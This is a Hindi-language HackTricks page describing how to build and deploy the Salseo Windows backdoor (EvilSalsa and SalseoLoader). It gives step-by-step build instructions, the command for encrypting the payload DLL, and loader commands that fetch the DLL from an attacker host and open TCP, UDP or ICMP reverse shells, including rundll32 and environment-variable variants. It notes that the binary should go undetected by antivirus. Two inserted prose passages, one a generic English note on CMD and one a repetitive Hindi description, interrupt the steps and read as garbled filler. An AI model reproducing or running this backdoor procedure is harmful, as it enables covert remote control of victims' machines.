# सालसेओ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में**

</details>

## बाइनरी को कंपाइल करें

गिथब से स्रोत कोड डाउनलोड करें और **EvilSalsa** और **SalseoLoader** को कंपाइल करें। कोड को कंपाइल करने के लिए आपको **Visual Studio** इंस्टॉल करने की आवश्यकता होगी।

इन प्रोजेक्ट्स को उस विंडोज बॉक्स के लिए कंपाइल करें जहां आप उन्हें उपयोग करने जा रहे हैं (यदि Windows x64 को समर्थन करता है, तो उन्हें उस आर्किटेक्चर के लिए कंपाइल करें)।

आप विज़ुअल स्टूडियो के अंदर आर्किटेक्चर को चुन सकते हैं जो आप चाहते हैं वह विज़ुअल स्टूडियो के **बाएं "बिल्ड" टैब** में **"प्लेटफ़ॉर्म टारगेट"** में होगा।

(\*\*यदि आप इस विकल्प को नहीं ढूंढ सकते हैं, तो **"प्रोजेक्ट टैब"** में क्लिक करें और फिर **"\<प्रोजेक्ट नाम> संपत्तियाँ"** में क्लिक करें)

![](<../.gitbook/assets/image (132).png>)

फिर, दोनों प्रोजेक्ट्स को बिल्ड करें (बिल्ड -> समाधान बिल्ड करें) (लॉग्स के अंदर एक्ज़ीक्यूटेबल के पथ दिखाई देगा):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## बैकडोर को तैयार करें

सबसे पहले, आपको **EvilSalsa.dll** को एनकोड करने की आवश्यकता होगी। इसके लिए, आप **encrypterassembly.py** पायथन स्क्रिप्ट का उपयोग कर सकते हैं या आप प्रोजेक्ट **EncrypterAssembly** को कंपाइल कर सकते हैं:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
# सालसेओ (Salseo)

एक सालसेओ (Salseo) एक विंडोज़ प्रवेशद्वार है जो एक हमलावर को एक सिस्टम पर अनदेखा रूप से पहुंचने की अनुमति देता है। यह एक बैकडोर (backdoor) तकनीक है जिसे एक हैकर उपयोग करके एक संगठन के सिस्टम में गुप्त रूप से प्रवेश कर सकता है।

इस तकनीक का उपयोग करके, हैकर एक विंडोज़ सिस्टम में एक बैकडोर इंजेक्शन करता है, जिससे वह एक निर्दिष्ट दूसरे सिस्टम से संचालित कर सकता है। यह बैकडोर उपयोगकर्ता के ज्ञान के बिना चलता है और उसे अनदेखा रूप से गतिशील रहने की अनुमति देता है।

एक बार जब सालसेओ सिस्टम में स्थापित हो जाता है, तो हैकर उसे दूरस्थ संगठन के सिस्टम में उपयोग कर सकता है। यह उपयोगकर्ता के ज्ञान के बिना एक विंडोज़ सिस्टम पर अनदेखा रूप से पहुंचने की अनुमति देता है और उसे दूसरे सिस्टमों के साथ संचालित करने की अनुमति देता है।

एक सालसेओ को स्थापित करने के लिए, हैकर एक विंडोज़ सिस्टम में एक बैकडोर इंजेक्शन करता है और उसे एक निर्दिष्ट संगठन के सिस्टम में उपयोग करने के लिए कॉन्फ़िगर करता है। इसके बाद, हैकर उसे दूसरे सिस्टमों के साथ संचालित करने के लिए उपयोग कर सकता है और उसे अपनी आवश्यकताओं के अनुसार निर्दिष्ट कर सकता है।

सालसेओ एक अत्यंत खतरनाक तकनीक है क्योंकि यह हैकर को एक संगठन के सिस्टम में गुप्त रूप से प्रवेश करने की अनुमति देता है और उसे अनदेखा रूप से गतिशील रहने की अनुमति देता है। इसलिए, सुरक्षा पेशेवरों को सावधान रहना चाहिए और इस तकनीक के खिलाफ सुरक्षा के उपाय अपनाने चाहिए।
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
ठीक है, अब आपके पास सभी चीजें हैं जिनकी आपको सालसेओ कार्य को कार्यान्वित करने के लिए आवश्यकता है: **एन्कोडेड EvilDalsa.dll** और **SalseoLoader का बाइनरी।**

**मशीन पर SalseoLoader.exe बाइनरी अपलोड करें। इन्हें कोई भी AV द्वारा पहचाना नहीं जाना चाहिए...**

## **बैकडोर को कार्यान्वित करें**

### **TCP रिवर्स शेल प्राप्त करना (HTTP के माध्यम से एन्कोडेड dll को डाउनलोड करना)**

याद रखें कि रिवर्स शेल सुनने वाले एनसी को शुरू करें और एक HTTP सर्वर शुरू करें जो एन्कोडेड evilsalsa को सेव करने के लिए उपयोग करेगा।
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **एक UDP रिवर्स शैल (SMB के माध्यम से एनकोड किए गए dll को डाउनलोड करना)**

याद रखें कि रिवर्स शैल सुनने वाले रूप में एनसी (nc) और एनकोड evilsalsa को सेव करने के लिए एक SMB सर्वर (impacket-smbserver) शुरू करें।
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **एक ICMP रिवर्स शेल प्राप्त करना (पीडीएल इम्पोर्ट किया गया है विक्टिम के अंदर)**

**इस बार आपको क्लाइंट में रिवर्स शेल प्राप्त करने के लिए एक विशेष उपकरण की आवश्यकता होगी। डाउनलोड करें:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP जवाब अक्षम करें:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### क्लाइंट को निष्पादित करें:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### पीड़ित के अंदर, हम सलसेओ चीज़ को निष्पादित करें:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoader को DLL के रूप में मुख्य फ़ंक्शन के निर्यात के रूप में कंपाइल करें

Visual Studio का उपयोग करके SalseoLoader परियोजना खोलें।

### मुख्य फ़ंक्शन के पहले जोड़ें: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### इस परियोजना के लिए DllExport इंस्टॉल करें

#### **उपकरण** --> **NuGet पैकेज प्रबंधक** --> **समाधान के लिए NuGet पैकेज प्रबंधन करें...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport पैकेज के लिए खोजें (ब्राउज़ टैब का उपयोग करके) और स्थापित करें (और पॉपअप स्वीकार करें)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)

आपके परियोजना फ़ोल्डर में निम्नलिखित फ़ाइलें दिखाई देती हैं: **DllExport.bat** और **DllExport\_Configure.bat**

### DllExport को अनइंस्टॉल करें

**अनइंस्टॉल** दबाएं (हाँ, यह अजीब है, लेकिन मुझ पर भरोसा करें, यह आवश्यक है)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### Visual Studio बंद करें और DllExport\_configure को चलाएं

बस Visual Studio **बंद** करें

फिर, अपने **SalseoLoader फ़ोल्डर** में जाएं और **DllExport\_Configure.bat** को **चलाएं**

**x64** का चयन करें (यदि आप इसे x64 बॉक्स के अंदर उपयोग करने जा रहे हैं, वह मेरा मामला था), **System.Runtime.InteropServices** का चयन करें (DllExport के लिए **Namespace** के अंदर) और **Apply** दबाएं

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### परियोजना को फिर से Visual Studio के साथ खोलें

**\[DllExport]** अब और त्रुटि के रूप में नहीं चिह्नित होना चाहिए

![](<../.gitbook/assets/image (8) (1).png>)

### समाधान को बिल्ड करें

**आउटपुट प्रकार = कक्षा पुस्तकालय** का चयन करें (परियोजना --> SalseoLoader गुण --> अनुप्रयोग --> आउटपुट प्रकार = कक्षा पुस्तकालय)

![](<../.gitbook/assets/image (10) (1).png>)

**x64** **प्लेटफ़ॉर्म** का चयन करें (परियोजना --> SalseoLoader गुण --> बिल्ड --> प्लेटफ़ॉर्म लक्ष्य = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

समाधान को **बिल्ड** करने के लिए: बिल्ड --> समाधान बिल्ड करें (नई DLL के पथ कंसोल में दिखाई देगा)

### उत्पन्न Dll का परीक्षण करें

उस स्थान पर Dll की प्रतिलिपि बनाएं और पेस्ट करें जहां आप इसे परीक्षण करना चाहते हैं।

चलाएं:
```
rundll32.exe SalseoLoader.dll,main
```
यदि कोई त्रुटि प्रदर्शित नहीं होती है, तो संभवतः आपके पास एक कार्यात्मक DLL है !!

## DLL का उपयोग करके शैल प्राप्त करें

एक **HTTP** **सर्वर** का उपयोग करना न भूलें और एक **nc** **सुनने वाला** सेट करें

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It allows users to interact with the operating system by executing commands. CMD provides a wide range of commands that can be used to perform various tasks, such as navigating through directories, managing files and folders, running programs, and configuring system settings.

CMD is a powerful tool for both regular users and hackers. It can be used to execute various hacking techniques, such as creating backdoors, exploiting vulnerabilities, and conducting reconnaissance. Hackers can leverage CMD to gain unauthorized access to systems, escalate privileges, and perform malicious activities.

As a hacker, it is important to have a good understanding of CMD and its commands. By mastering CMD, you can effectively navigate and manipulate the Windows operating system, making it easier to carry out hacking activities. However, it is crucial to use CMD responsibly and ethically, as unauthorized access and malicious activities are illegal and can lead to severe consequences.

CMD is a versatile tool that can be used for both legitimate and malicious purposes. It is essential for hackers to stay updated with the latest CMD commands and techniques to stay ahead in the ever-evolving world of hacking.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहते हैं? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें,** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके।**

</details>
